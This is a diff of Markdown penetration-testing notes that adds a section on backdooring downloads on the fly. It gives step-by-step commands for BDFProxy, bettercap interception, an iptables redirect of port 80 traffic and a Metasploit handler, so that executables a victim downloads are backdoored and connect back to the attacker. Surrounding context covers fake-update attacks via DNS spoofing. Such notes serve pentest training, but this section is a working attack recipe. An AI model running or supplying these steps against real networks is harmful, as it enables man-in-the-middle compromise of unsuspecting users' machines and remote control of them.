@@ -108,7 +108,7 @@ set LHOST 10.10.10.10
 set LPORT 8080
 exploit
 ```
-## Hacking Windows 10 Using Fake Update
+## Fake Update
 1. We need to do MITM
 2. We need to serve fake update form evilgrade
 
@@ -160,6 +160,42 @@ set dns.spoof.domains update.speedbit.com
 dns.spoof on
 ```
 start the listener
+
+## Backdooring Downloads on The Fly
+Tool: Backdoor Factory Proxy  
+```
+cd /opt/BDFProxy
+nano bdfproxy.cfg
+proxyMode = transparent
+search for Windowsx86 - x64 or Linuxx86 - x64 depent of target change HOST to your ip
+./bdf_porxy.py
+```
+So this program right now is running on its own,
+and as soon as it receives a request for an EXE,
+it's going to backdoor that executable.
+```
+bettercap -iface eth0 -caplet /.cap
+```
+use iptables to redirect the data form bettercap to BDFProxy
+```
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+```
+So now we're using bettercap to intercept data.
+All this data is gonna be redirected using this rule
+to BDFProxy, which will wait and see
+if there is an EXE being downloaded,
+it'll backdoor it, and then serve it back to the target.
+When the target executes the EXE, will execute a backdoor
+that'll send the connection back to me.  
+Start Listener Meterpreter or use the resource file from Backdoor Factory Proxy
+this file right here will automatically start
+the multi/handler and listen for incoming connections
+for all of the payloads that we sow
+in the configuration file of BDFProxy.
+```
+msfconsole --resource /opt/BDFProxy/bdfproxy_msf_resource.rc
+```
+test whit speedbit or any exe 
 
 ## Pentesting Resources
 https://github.com/swisskyrepo/PayloadsAllTheThings  
